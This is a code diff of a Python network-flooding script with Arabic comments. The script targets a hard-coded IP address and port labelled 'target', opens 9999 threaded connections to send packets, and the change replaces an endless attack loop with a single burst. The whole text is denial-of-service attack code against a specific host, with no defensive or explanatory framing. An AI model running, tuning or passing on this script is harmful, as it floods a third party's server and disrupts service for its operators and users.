@@ -1,7 +1,7 @@
 import socket
 import threading
 
-# إعدادات الاتصال
+# إعدادات الاتصال (تم تحديد IP والمنفذ مسبقًا)
 ip = "5.223.46.86"  # عنوان IP الهدف
 port = 10009  # المنفذ الهدف
 num_connections = 9999  # عدد الاتصالات
@@ -22,18 +22,15 @@ def send_packets(ip, port, packet, num_send_per_connection):
     except Exception as e:
         print(f"[-] Error: {e}")
 
-# حلقة الهجوم الرئيسية
-try:
-    while True:  # تشغيل مستمر حتى يتم الإيقاف يدويًا
-        threads = []
-        for _ in range(num_connections):
-            thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
-            threads.append(thread)
-            thread.start()
+# تنفيذ الاتصالات باستخدام Threads
+threads = []
+for _ in range(num_connections):
+    thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
+    threads.append(thread)
+    thread.start()
 
-        # الانتظار حتى تنتهي جميع الـ Threads
-        for thread in threads:
-            thread.join()
+# الانتظار حتى تنتهي جميع الـ Threads
+for thread in threads:
+    thread.join()
 
-except KeyboardInterrupt:
-    print("\n[!] Program stopped by user. Exiting...")
+print("Done sending packets.")
